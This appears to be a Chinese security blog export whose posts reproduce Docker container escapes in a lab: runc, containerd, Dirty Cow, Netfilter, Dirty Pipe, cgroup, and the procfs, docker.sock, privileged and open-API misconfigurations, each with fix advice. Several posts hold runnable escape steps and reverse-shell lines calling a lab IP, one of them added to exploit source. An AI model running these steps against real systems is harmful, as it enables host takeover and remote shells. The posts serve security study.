cve .docker run -d cve /bin/bash -c &quot;tail -f /dev/null&quot;cp /usr/bin/docker-runc /usr/bin/docker-runc.bakdocker exec -it docker-id /bin/bashcd /root &amp;&amp; ./run.sh &amp;&amp; exitdocker exec -it docker-id /bin/bash\n‍\n方法三 CDK\nCDK 旧版本的\nsudo ./cdk run runc-pwn  //自动检测本地 runc 版本及漏洞情况sudo ./cdk run runc-pwn --container &lt;容器ID/名称&gt;\n修复方式\n升级 runc 至 1.0.0-rc7 + 或 Docker 至 18.09.2+\n","categories":["云安全"]},{"title":"CVE-2020-15257(containerd逃逸)","url":"/2025/08/22/CVE-2020-15257-containerd%E9%80%83%E9%80%B8/","content":"影响版本\ncontainerd &lt;1.3.9 或 &lt;1.4.3\n漏洞原理\ncontainerd 是 Docker 等容器平台的核心运行时组件，其架构中包含containerd-shim进程，负责中间层管理（如进程监控、信号转发、IO 重定向等），隔离 containerd 主进程与容器进程。containerd&lt;-&gt;containerd-shim&lt;-&gt;runc​\n\n攻击者可通过恶意容器构造特殊进程，利用 containerd-shim 进程的文件描述符（FD）管理缺陷，获取宿主机的敏感文件描述符，最终实现容器逃逸并访问宿主机资源。\nshim 在处理子进程退出信号（SIGCHLD）时，未正确验证进程 PID 的归属，导致攻击者可伪造 PID 欺骗 shim，获取本应属于宿主机的文件描述符。\n\nshim 的进程管理逻辑： 当容器内进程退出时，内核会发送 SIGCHLD 信号给 shim，shim 通过waitpid()系统调用回收进程资源。此时，shim 会将该进程关联的文件描述符（如标准输入 / 输出的 FD）关闭。\nPID 验证缺陷： 正常情况下，shim 应只处理容器内的进程（即属于容器 PID 命名空间的进程）。但漏洞版本中，shim 未验证waitpid()返回的 PID 是否属于容器内的进程，而是直接处理所有 SIGCHLD 信号触发的进程回收，导致了漏洞的产生。\n\n攻击者在容器内创建恶意进程，同时在宿主机侧构造同名 PID 的进程（通过命名空间逃逸或 PID 复用）。当宿主机侧进程退出时，shim 会错误地将其 FD 传递给容器内的恶意进程，导致容器内进程可访问宿主机的 FD（如宿主机的文件、设备等）。\n环境搭建\n#卸载sudo yum remove -y docker \\                  docker-client \\                  docker-client-latest \\                  docker-common \\                  docker-latest \\                  docker-latest-logrotate \\                  docker-logrotate \\                  docker-engine \\                  containerd.io\n# 安装 containerd 1.3.7（漏洞版本）sudo yum install -y containerd.io-1.3.7-3.1.el7# 安装 Docker 19.03.8（与 containerd 1.3.7 兼容）sudo yum install -y docker-ce-19.03.8 docker-ce-cli-19.03.8containerd --versiondocker --versionsystemctl start docker.service systemctl enable docker.service\n\ndocker run --name  nginx-test --net=host -p 8080:80 -d nginxdocker exec -it  nginx-test /bin/bashcat /proc/net/unix|grep -a &quot;containerd-shim&quot;\n\nroot 容器： 获取宿主机 FD 后，可直接读写宿主机的敏感文件（如修改/etc/sudoers）或挂载设备，实现完整逃逸。\n–net=host ： 启动会暴露containerd-shim 监听的 Unix 域套接字，攻击者若能访问 containerd-shim 的 Unix 域套接字，可能：\n\n发送伪造的进程退出信号，辅助触发 shim 的wait4()逻辑；\n通过套接字获取容器进程与 shim 的通信信息，更容易猜测或伪造 PID；\n直接与 shim 交互，操纵其对 FD 的管理逻辑，加速文件描述符泄露。\n\n漏洞复现\ncdk 用旧版本的\n此漏洞利用会导致 Docker/containerd 出现一些问题。其中会残留一个悬挂的 containerd-shim 和 Docker 容器，需要docker rm --force分别将其终止和 d 以进行清理。\n#把工具放到容器里docker cp cdk nginx-test:/tmp#kali监听nc -lvvp 6666\n\ndocker exec -it  nginx-test /bin/bashcd /tmp ./cdk run shim-pwn 192.168.247.129 6666\n\n\n修复方式\n升级 containerd 至 1.3.10+ 或 1.4.4+\n‍\n","categories":["云安全"]},{"title":"CVE-2016-5195（Dirty Cow）","url":"/2025/08/30/CVE-2016-5195%EF%BC%88Dirty-Cow%EF%BC%89/","content":"影响版本\n内核版本在 2.6.22 至 4.8\nCentOS：CentOS 5.x、6.x、7.x 的 32 位和 64 位版本。\nDebian：Debian 6.x 32 位、Debian 7.x 的 32 位和 64 位版本、Debian 8.x 的 32 位和 64 位版本。\nUbuntu：Ubuntu Server 10.04.1 LTS 的 32 位和 64 位版本、Ubuntu Server 12.04.1 LTS 的 32 位和 64 位版本、Ubuntu Server 14.04.1 LTS 的 32 位和 64 位版本。\nRed Hat：Red Hat Enterprise Linux 5、6、7；Red Hat Enterprise MRG 2；Red Hat OpenShift Online V2；Red Hat Virtualization（RHEV-H/RHV-H）。\n漏洞原理\n容器逃逸中的核心原理是利用 Linux 内核写时复制（Copy-on-Write, COW）机制的竞态条件，突破容器的隔离限制，实现从容器到宿主机的权限提升。\n容器与宿主机共享同一内核，若宿主机内核版本在 2.6.22 至 4.8 之间且未打补丁，容器内的攻击者可直接利用 Dirty Cow 漏洞。即使容器通过命名空间（Namespace）实现进程、文件系统等资源隔离，内核漏洞仍能绕过这些机制，直接操作宿主机内存空间。\n环境搭建\n选择 2.6.22 至 4.8 之间未打补丁的内核（如 Ubuntu 12.04 LTS、Ubuntu 14.04 LTS、CentOS 7）,记得看一下内核版本,我用的内核高了没成功，降了一次级。\n\n# 下载未修复的内核镜像包（3.10.0-327.36.2.el7）wget http://vault.centos.org/7.2.1511/updates/x86_64/Packages/kernel-3.10.0-327.36.2.el7.x86_64.rpmsudo rpm -ivh --oldpackage kernel-3.10.0-327.36.2.el7.x86_64.rpmrpm -qa | grep kernel | grep 3.10.0-327.36.2# 查看内核启动顺序（找到 3.10.0-327.36.2.el7 对应的索引）sudo awk -F\\&#x27; &#x27;$1==&quot;menuentry &quot; &#123;print i++ &quot; : &quot; $2&#125;&#x27; /etc/grub2.cfg# 设置旧内核为默认启动项（假设索引为 0）sudo grub2-set-default 0sudo grub2-mkconfig -o /boot/grub2/grub.cfgsudo reboot\nPOC，下载一下POC在Dockerfile的目录下\nFROM ubuntu:14.04# 更新软件源并安装必要工具RUN apt-get updateRUN apt-get install -y build-essentialRUN apt-get install -y gcc# 创建工作目录RUN mkdir /dirtycow# 下载dirtyc0w.c漏洞利用代码放进容器COPY dirtyc0w.c /dirtycow/dirtyc0w.c# 进入工作目录并编译漏洞利用程序WORKDIR /dirtycowRUN gcc -pthread dirtyc0w.c -o dirtyc0w -lcrypt# 容器启动时进入bash#CMD [&quot;/bin/bash&quot;]CMD [&quot;./dirtyc0w&quot;, &quot;/etc/passwd&quot;, &quot;root::0:0:root:/root:/bin/bash&quot;]\n修改一下dirtyc0w.c,增加反弹shell的代码\n*You have to wait for the threads to finish.*/  pthread_join(pth1,NULL);  pthread_join(pth2,NULL);    // 连接 192.168.247.129 的 3333 端口，反弹 bash  system(&quot;bash -i &gt;&amp; /dev/tcp/192.168.247.129/3333 0&gt;&amp;1 &amp;&quot;);     return 0;\n在包含Dockerfile的目录下，使用以下命令构建 Docker 镜像：\ndocker build -t cve-2016-5195-pro .\n下载太慢了，中途下载了个proxychains丢进去安装了一下\nsudo yum install -y git gcc makegit clone https://github.com/rofl0r/proxychains-ng.gitcd proxychains-ng./configure --prefix=/usr --sysconfdir=/etcmakesudo make installsudo make install-configsudo vim /etc/proxychains.confsocks5  IP 7890\n漏洞复现\ndirtyc0w\n# CMD [&quot;./dirtyc0w&quot;, &quot;/etc/passwd&quot;, &quot;root::0:0:root:/root:/bin/bash&quot;] 运行即可触发docker run -it --network=host cve-2016-5195-pro /bin/bash\n\ndirtycow-vdso\nPOC 这个对内核要求太高了，环境建议Ubuntu 14.04​3.13.0-100-generic 之前的版本,Debian 8 系列：内核版本 3.16.x 至 4.4.x（未修复漏洞的版本）。不好搞，放个代码\nFROM ubuntu:14.04RUN apt-get updateRUN apt-get install -y build-essentialRUN apt-get install -y nasmRUN apt-get install -y gitRUN mkdir /dirtycowCOPY dirtycow-vdso /dirtycow-vdso\n在包含Dockerfile的目录下，使用以下命令构建 Docker 镜像：\ndocker build -t cve-2016-5195-next .docker run -it cve-2016-5195-next /bin/bashcd dirtycow-vdsomake./0xdeadbeef 192.168.247.129:3333\n修复建议\n升级内核，对应的发版如下\n\nCentOS 7：kernel-3.10.0-327.36.3.el7 及以上\nUbuntu 14.04：linux-image-3.13.0-100-generic 及以上\nDebian 8：linux-image-3.16.0-4-amd64 及以上\n\n‍\n","categories":["云安全"]},{"title":"CVE-2021-22555（Netfilter堆溢出）","url":"/2025/08/30/CVE-2021-22555%EF%BC%88Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%EF%BC%89/","content":"影响版本\nLinux内核 2.6.19-rc1～5.12-rc8\n\nAlibaba Cloud Linux 2/3、CentOS 7/8、RedHat 7/8、Ubuntu 14/16/18/20、Debian 8/9/10、SUSE Linux Enterprise Server 12/15、OpenSUSE 42.3/15\n漏洞原理\n利用内核级网络组件的堆溢出缺陷，突破容器依赖的内核隔离机制（命名空间等），从受限制的容器环境获取宿主机权限。\nNetfilter模块在处理32位进程的sockopt请求时发生堆溢出，攻击者通过堆喷（Heap Spraying）和UAF（Use-After-Free）技术控制内核内存，执行ROP链提权至root权限。\n环境搭建\n#更新内核proxychains4 wget https://dl.lamp.sh/kernel/el7/kernel-ml-5.10.48-1.el7.x86_64.rpmproxychains4 wget https://dl.lamp.sh/kernel/el7/kernel-ml-devel-5.10.48-1.el7.x86_64.rpmproxychains4 wget https://dl.lamp.sh/kernel/el7/kernel-ml-headers-5.10.48-1.el7.x86_64.rpmyum localinstall kernel-ml-* --skip-brokenawk -F\\&#x27; &#x27;$1==&quot;menuentry &quot; &#123;print i++ &quot; : &quot; $2&#125;&#x27; /etc/grub2.cfg#若 5.10.48 内核的索引为 1grub2-set-default 1rebootuname -r\n\nFROM centos:7# 配置CentOS 7归档源（使用echo避免语法错误）RUN rm -f /etc/yum.repos.d/*.repo &amp;&amp; \\    echo &quot;[base]&quot; &gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;name=CentOS-7 - Base&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;baseurl=http://vault.centos.org/7.9.2009/os/\\$basearch/&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;gpgcheck=1&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;gpgkey=http://vault.centos.org/7.9.2009/os/\\$basearch/RPM-GPG-KEY-CentOS-7&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    \\    echo &quot;[updates]&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;name=CentOS-7 - Updates&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;baseurl=http://vault.centos.org/7.9.2009/updates/\\$basearch/&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;gpgcheck=1&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;gpgkey=http://vault.centos.org/7.9.2009/os/\\$basearch/RPM-GPG-KEY-CentOS-7&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    \\    echo &quot;[extras]&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;name=CentOS-7 - Extras&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;baseurl=http://vault.centos.org/7.9.2009/extras/\\$basearch/&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;gpgcheck=1&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;gpgkey=http://vault.centos.org/7.9.2009/os/\\$basearch/RPM-GPG-KEY-CentOS-7&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo# 安装基础工具和32位依赖RUN yum clean all &amp;&amp; yum makecache &amp;&amp; \\    yum install -y gcc gcc-c++ make glibc-devel.i686 glibc-static.i686 libstdc++-devel.i686# 创建工作目录RUN mkdir -p /cve-2021-22555COPY exploit.c /cve-2021-22555/WORKDIR /cve-2021-22555# 编译漏洞利用程序（32位静态编译）RUN gcc -m32 -static -std=c99 -o exploit exploit.c# 设置启动命令CMD [&quot;/bin/bash&quot;]\nproxychains4 docker build -t cve-2021-22555:latest .\n漏洞复现\nPOC\n漏洞利用需要容器具备特定权限：--privileged和--cap-add=NET_ADMIN是必要的，因为漏洞涉及网络命名空间操作\ndocker run -it --rm --privileged --cap-add=NET_ADMIN --security-opt apparmor=unconfined cve-2021-22555:latest\n# 进入容器后执行cd /cve-2021-22555./exploit\n漏洞利用成功率并非 100%，可能需要多次尝试（建议尝试 3-5 次）\n成功利用后会显示 “got root!” 并获取 root 权限，可通过id命令验证。\n修复建议\nCentOS/RHEL 7kernel-3.10.0-1160.36.2.el7 或更高\nCentOS/RHEL 8kernel-4.18.0-348.2.1.el8_5 或更高\nUbuntu 20.04linux-image-5.4.0-91-generic 或更高\n内核主线（mainline）5.12.1 及以上\n‍\n","categories":["云安全"]},{"title":"挂载逃逸（Procfs）","url":"/2025/08/30/%E6%8C%82%E8%BD%BD%E9%80%83%E9%80%B8%EF%BC%88Procfs%EF%BC%89/","content":"影响版本\n危险的配置错误。只要满足以下条件，无论 Docker 版本新旧，均存在风险\n漏洞原理\n若将宿主机的/proc目录挂载到容器内，攻击者可利用其core_pattern等机制实现逃逸\n环境搭建\nsudo docker run -it -v /proc/sys/kernel/core_pattern:/host/core_pattern ubuntu /bin/bash#若返回2，则说明挂载了宿主机的procfsfind / -name core_pattern | wc -l#找到merged目录路径（如/var/lib/docker/overlay2/.../merged）cat /proc/mounts | grep overlay \n\n在输出中寻找 upperdir 或 workdir，其父目录通常包含 merged 目录。一般在宿主机才能看到，容器内查替换一下目录就可以。\n\n漏洞复现\n编写反弹脚本​​exploit.sh​,脚本放在容器的 /tmp/目录下，那么它在宿主机上的绝对路径就是 &lt;merged-path&gt;/tmp/exploit.sh。\necho -e &#x27;#!/bin/bash\\nbash -i &gt;&amp; /dev/tcp/192.168.247.129/3333 0&gt;&amp;1&#x27; &gt; /tmp/exploit.shchmod +x exploit.sh\n修改core_pattern\n#替换eb8bb6a79842369f78355661a99b1674424e1c76cf316824eab9102e7818fbb1echo -e &quot;|/var/lib/docker/overlay2/eb8bb6a79842369f78355661a99b1674424e1c76cf316824eab9102e7818fbb1/merged/tmp/exploit.sh \\rcore&quot; &gt; /host/proc/sys/kernel/core_pattern\n触发漏洞\n在容器内运行一个会崩溃的程序，触发核心转储执行恶意脚本\ncat &gt; /tmp/test.c &lt;&lt; EOF#include &lt;stdio.h&gt;int main() &#123;    int *p = NULL;    *p = 42; // 对NULL指针解引用，必然导致段错误    return 0;&#125;EOF\ncd /tmpapt update &amp;&amp; apt install -y gccgcc -o test test.c./test\n\n\n修复建议\n最根本的解决方法是不要将宿主机的​ ​/proc​​目录挂载到容器内部，尤其是那些不受信任或不需要直接与宿主机进程交互的容器。在运行容器时，检查并避免使用 -v /proc:/host/proc 这类挂载选项\n","categories":["云安全"]},{"title":"挂载逃逸（Socket）","url":"/2025/08/30/%E6%8C%82%E8%BD%BD%E9%80%83%E9%80%B8%EF%BC%88Socket%EF%BC%89/","content":"影响版本\n危险的配置错误。只要满足以下条件，无论 Docker 版本新旧，均存在风险\n\n挂载了 Docker Socket: 启动容器时使用了 -v /var/run/docker.sock:/var/run/docker.sock 这样的参数\n容器内权限足够: 攻击者在容器内获得的用户权限（通常是 root）足以执行 Docker 命令或与 socket 文件交互。\n\n漏洞原理\n当容器被授予了与 Docker 守护进程（Docker Daemon）直接通信的权限时，攻击者可以利用此权限控制宿主机。通常是由于将宿主机的 /var/run/docker.sock 文件挂载到容器内部实现的。\n环境搭建\nsudo docker run -v /var/run/docker.sock:/var/run/docker.sock -it --name vulnerable_container ubuntu /bin/bash\n漏洞复现\n容器内安装Docker客户端\napt update &amp;&amp; apt install -y docker.io\n可以利用Socket控制宿主机Docker：通过sock文件与宿主机Docker通信，例如列出宿主机的容器：\ndocker -H unix:///var/run/docker.sock ps -a\n逃逸：创建一个新容器，将宿主机根目录挂载到新容器内\ndocker -H unix:///var/run/docker.sock run -it -v /:/escape ubuntu /bin/bash\n然后在新容器内执行chroot /escape bash即可访问宿主机文件系统。\n#在桌面创建了一个文件1.txtecho &quot;test&quot; &gt;1.txt#容器的容器内执行,读取文件chroot /escape bashcat 1.txt\n\n\n修复建议\nDocker Socket 逃逸是一种高风险配置错误，它并非特定版本的漏洞。其核心在于容器内进程获得了与高权限的 Docker 守护进程通信的能力。防范的关键在于避免不必要的敏感挂载、遵循最小权限原则并实施严格的身份验证和授权。\n‍\n","categories":["云安全"]},{"title":"CVE-2022-0847（Dirty Pipe）","url":"/2025/08/30/CVE-2022-0847%EF%BC%88Dirty-Pipe%EF%BC%89/","content":"漏洞原理\n该漏洞源于 Linux 内核中copy_page_to_iter_pipe()函数对pipe buffer的flags字段缺乏正确的初始化。当使用管道进行write和read后，可让目标管道的每个pipe buffer都带上PIPE_BUF_FLAG_CAN_MERGE标志。之后使用splice从目标文件的指定位置传送数据到之前处理过的管道中，splice底层会直接用文件缓存页来替换管道缓冲页，但没有初始化flags字段。此时再调用pipe write时，由于PIPE_BUF_FLAG_CAN_MERGE标志存在，内容会接着上次被写入同一个管道缓冲页中，而这个管道缓冲页其实已变成目标文件的缓存页，从而导致直接修改了目标文件缓存页。短时间内访问该文件的操作都会读到被篡改的文件缓存页，攻击者可借此修改/etc/passwd或者一些suid文件等来实现提权目的。\n影响版本\nLinux内核 5.8–5.10.102、5.15.0–5.15.25、5.16.0–5.16.11\n环境搭建\nFROM centos:7# 配置CentOS 7归档源（使用echo避免语法错误，确保源可用）RUN rm -f /etc/yum.repos.d/*.repo &amp;&amp; \\    echo &quot;[base]&quot; &gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;name=CentOS-7 - Base&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;baseurl=http://vault.centos.org/7.9.2009/os/\\$basearch/&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;gpgcheck=1&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;gpgkey=http://vault.centos.org/7.9.2009/os/\\$basearch/RPM-GPG-KEY-CentOS-7&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    \\    echo &quot;[updates]&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;name=CentOS-7 - Updates&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;baseurl=http://vault.centos.org/7.9.2009/updates/\\$basearch/&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;gpgcheck=1&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;gpgkey=http://vault.centos.org/7.9.2009/os/\\$basearch/RPM-GPG-KEY-CentOS-7&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    \\    echo &quot;[extras]&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;name=CentOS-7 - Extras&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;baseurl=http://vault.centos.org/7.9.2009/extras/\\$basearch/&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;gpgcheck=1&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; \\    echo &quot;gpgkey=http://vault.centos.org/7.9.2009/os/\\$basearch/RPM-GPG-KEY-CentOS-7&quot; &gt;&gt; /etc/yum.repos.d/CentOS-Base.repo# 安装漏洞复现所需的基础工具（64位编译环境，无需32位库）RUN yum clean all &amp;&amp; yum makecache &amp;&amp; \\    yum install -y \\    gcc \\    gcc-c++ \\    make \\    sudo  # 用于后续提权验证（su/sudo命令依赖） &amp;&amp; \\    yum clean all# 创建漏洞利用工作目录（规范文件结构）RUN mkdir -p /cve-2022-0847WORKDIR /cve-2022-0847RUN cp CVE-2022-0847-DirtyPipe-Exploit /RUN gcc dirtypipez.c -o dirtypipez RUN cp dirtypipez /cve-2022-0847/# 启动命令：进入交互shell，默认切换到工作目录CMD [&quot;bash&quot;, &quot;-c&quot;, &quot;cd /cve-2022-0847 &amp;&amp; bash&quot;]\ndocker build -t dirtypipe:v1 .\n漏洞复现\nPOC\ndocker run -it --rm --privileged -v /etc:/mnt dirtypipe:v1# 挂载宿主机/etc到容器/mnt，用于篡改passwd# 必须：确保容器有修改挂载文件的权限# 直接执行编译好的程序，目标为宿主机/etc/passwd（挂载在/mnt/passwd）./dirtypipez /mnt/passwd# 提权验证（成功后无密码切换到dirtypipe用户，再获取root）su dirtypipe &amp;&amp; sudo -i# 验证权限（输出uid=0即成功）id\n修复建议\n将 Linux 内核升级至 5.17 及以上版本，新版本的内核已经修复了该漏洞的相关代码逻辑。\n‍\n","categories":["云安全"]},{"title":"Docker API未授权访问","url":"/2025/08/30/Docker-API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/","content":"影响版本\n危险的配置错误。只要满足以下条件，无论 Docker 版本新旧，均存在风险\n漏洞原理\nDocker守护进程若暴露2375端口且无认证，攻击者可远程管理Docker。\n环境搭建\n在 Docker 守护进程的配置中开放 TCP 2375 端口（此端口通常用于非加密的 Docker Remote API 通信）。编辑 /etc/docker/daemon.json 文件（如果不存在则创建），添加以下内容\n&#123;  &quot;hosts&quot;: [&quot;tcp://0.0.0.0:2375&quot;, &quot;unix:///var/run/docker.sock&quot;]&#125;\n或者修改 systemd 的 Docker 服务文件（如 /usr/lib/systemd/system/docker.service），在 ExecStart 行追加 -H tcp://0.0.0.0:2375​\nsudo vim /usr/lib/systemd/system/docker.service-H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock\n\n重启docker\nsudo systemctl daemon-reloadsudo systemctl restart dockernetstat -tuln | grep 2375\n‍\n漏洞复现\n直接连接就可以了\ndocker -H tcp://&lt;你的服务器IP&gt;:2375 info\n\n‍\n修复建议\n\n\n使用 TLS：通过配置 Docker 来使用 TLS 加密 TCP 连接。这涉及到生成证书和修改 daemon.json 来启用 TLS。具体步骤可以查看 Docker 的官方文档。\n\n\n限制访问：仅允许特定的 IP 地址或网络访问 TCP 端口。\n\n\n使用 VPN 或其他安全通道：确保远程连接是通过安全的网络通道进行的。\n\n\n","categories":["云安全"]},{"title":"特权容器逃逸（privileged）","url":"/2025/08/30/%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%EF%BC%88privileged%EF%BC%89/","content":"影响版本\n危险的配置错误。只要满足以下条件，无论 Docker 版本新旧，均存在风险\n漏洞原理\n启用–privileged标志的容器拥有宿主机所有权限，可直接操作宿主机设备（如挂载/dev/sda5）或加载内核模块突破隔离。\n环境搭建\ndocker run --privileged -it ubuntu /bin/bash#cat /proc/self/status | grep CapEff，特权模式容器CapEff掩码值通常为0000003fffffffff或0000001fffffffff\n漏洞复现\n容器内查看磁盘\nlsblk\n\n容器内的/etc/passwd\n\n容器内获取权限\nmkdir /testmount /dev/sda5 /test  # 请根据实际磁盘设备修改# 访问宿主机,即可获得一个宿主机Shell。chroot /test bashcat /etc/passwd\n\n成功把内核加载进容器，获得宿主机权限。\n修复建议\n避免使用–privileged模式或–cap-add=SYS_ADMIN赋予容器宿主机级权限，而是采用–cap-drop=ALL --cap-add=NET_ADMIN等方式，只给容器授予必要的权限。\n‍\n‍\n","categories":["云安全"]},{"title":"CVE-2022-0492（cgroup逃逸）","url":"/2025/08/30/CVE-2022-0492%EF%BC%88cgroup%E9%80%83%E9%80%B8%EF%BC%89/","content":"影响版本\n2.6.24-rc1 至 5.17-rc2\n漏洞原理\ncgroup 是 Linux 内核的一个功能，用于限制、控制与分离一个进程组群的资源。cgroup v1 有一个 release_agent 文件，允许管理员配置一个 “发布代理” 程序，当 cgroup 中的最后一个进程退出时，内核会检查该 cgroup 的 notify_on_release 参数是否启用，如果启用，就会以 root 身份运行 release_agent 文件中指定的程序。\n按照正常的安全逻辑，只有具有特定权限（如 CAP_SYS_ADMIN）的用户才能修改 release_agent 文件。然而，该漏洞没有针对性地检查设置 release_agent 文件的进程是否具有正确的权限。\n利用方式：攻击者可以在容器内通过 unshare 命令创建新的用户命名空间，在新的命名空间中，攻击者可以获得包括 CAP_SYS_ADMIN 在内的全部 capabilities。此时，攻击者即使在原本没有 CAP_SYS_ADMIN 权限的情况下，也能够修改 release_agent 文件，将其指向一个恶意程序。当 cgroup 中的进程终止时，内核会根据 notify_on_release 的设置，以 root 权限运行攻击者指定的恶意程序，从而实现容器逃逸，获取宿主机的控制权。\n环境搭建\n#带有sys_admin 启动docker， 关闭apparmor(否则无法mount)docker run --rm -it -h cve1 --name cve1 --cap-add=SYS_ADMIN --security-opt=&quot;apparmor=unconfined&quot; ubuntu:20.04 /bin/bash \n//没有sys_adminproxychains4 docker pull ubuntu:20.04docker run --rm -it -h cve2 --name cve2 --security-opt=&quot;seccomp=unconfined&quot; --security-opt=&quot;apparmor=unconfined&quot; ubuntu:20.04 /bin/bashapt update &amp;&amp; apt install -y util-linux  # 提供unshare命令 apt update &amp;&amp; apt install -y libcap2-bin  #提供capshcapsh --print | grep &quot;CAP_SYS_ADMIN&quot; #空表示没有权限\n漏洞复现\n进入容器后获取权限\nunshare -urmcbash\n挂载 cgroup，创建子目录\nmkdir /tmp/mountestmount -t cgroup -o rdma cgroup /tmp/mountestmkdir /tmp/mountest/x\n配置 release_agent\n在之前创建的 cgroup 子目录中进行配置：\n# 设置notify_on_release为1echo 1 &gt; /tmp/mountest/x/notify_on_release# 设置release_agent指向容器内的一个脚本（后续会被替换为宿主机路径）echo &quot;/escape.sh&quot; &gt; /tmp/mountest/release_agent\n创建逃逸脚本\necho &#x27;#!/bin/sh&#x27; &gt; /escape.shecho &#x27;cp /etc/passwd /tmp/host_passwd&#x27; &gt;&gt; /escape.sh  # 示例：复制宿主机passwd文件echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.247.129/6666 0&gt;&amp;1&#x27; &gt;&gt; /escape.sh chmod +x /escape.sh\n触发 release_agent 执行\n# 在cgroup中创建一个进程sh -c &quot;echo \\$\\$ &gt; /tmp/mountest/x/cgroup.procs&quot;# 终止该进程以触发release_agentkill -9 $(cat /tmp/mountest/x/cgroup.procs)\n反弹shell只有连一下，一瞬间就会结束\n修复建议\n及时跟进内核和 Docker 等容器运行时的安全更新，修补已知漏洞。\n\n\nUbuntu：\n\nUbuntu 22.04 LTS（内核版本≥5.15.0-25，包含后端移植的修复补丁）\nUbuntu 20.04 LTS（内核版本≥5.4.0-107，通过安全更新修复）\nUbuntu 18.04 LTS（内核版本≥4.15.0-197，通过安全更新修复）\n\n\n\nCentOS/RHEL：\n\nCentOS 8/RHEL 8（内核版本≥4.18.0-348.20.1，通过安全更新修复）\nCentOS 7/RHEL 7（内核版本≥3.10.0-1160.59.1，通过安全更新修复）\n\n\n\nDebian：\n\nDebian 11（Bullseye，内核版本≥5.10.106-1，包含修复）\nDebian 10（Buster，内核版本≥4.19.249-2，通过安全更新修复）\n\n\n\n","categories":["云安全"]},{"title":"Docker漏洞总结","url":"/2025/08/30/Docker%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","content":"容器逃逸漏洞是云原生安全领域的核心威胁，攻击者通过利用这些漏洞可突破容器隔离环境，获取宿主机或集群控制权。\n检测脚本\n一、容器运行时自身漏洞\n此类漏洞源于容器引擎或运行时组件的设计缺陷。\n\n\nCVE-2019-5736（runc逃逸）\n\n影响版本：Docker ≤18.09.2，runc ≤1.0-rc6。\n原理：runc 进程在启动容器时未正确隔离自身文件描述符，导致容器内恶意进程可覆盖宿主机的 runc 二进制文件，最终实现容器逃逸并获取宿主机 root 权限。\nCVE-2019-5736（runc逃逸）\n\n\n\nCVE-2020-15257（containerd逃逸）\n\n影响版本：containerd &lt;1.3.9 或 &lt;1.4.3。\n原理：通过恶意容器构造特殊进程，利用 containerd-shim 进程的文件描述符（FD）管理缺陷，获取宿主机的敏感文件描述符，最终实现容器逃逸并访问宿主机资源。\nCVE-2020-15257（containerd逃逸）\n\n‍\n\n\n二、Linux内核漏洞\n容器共享宿主机内核，内核漏洞可被用于逃逸。\n\n\nCVE-2016-5195（Dirty Cow）\n\n影响版本：Linux内核 2.6.22–4.8.3。\n原理：利用Linux写时复制（COW）机制竞争条件漏洞，覆盖只读内存页，实现本地提权并逃逸容器。\nCVE-2016-5195（Dirty Cow）\n\n\n\nCVE-2021-22555（Netfilter堆溢出）\n\n影响版本：Linux内核 2.6.19-rc1～5.12-rc8。\n原理：Netfilter模块在处理32位进程的sockopt请求时发生堆溢出，攻击者通过堆喷（Heap Spraying）和UAF（Use-After-Free）技术控制内核内存，执行ROP链提权至root权限。\nCVE-2021-22555（Netfilter堆溢出）\n\n\n\nCVE-2022-0847（Dirty Pipe）\n\n影响版本：Linux内核 5.8–5.10.102、5.15.0–5.15.25、5.16.0–5.16.11。\n原理：管道（pipe）缓冲区未初始化，攻击者覆盖宿主机敏感文件（如/etc/passwd或SSH密钥），实现权限提升。\nCVE-2022-0847（Dirty Pipe）\n\n\n\nCVE-2022-0492（cgroup逃逸）\n\n影响版本：linux内核 5.17-rc3\n原理：利用cgroup 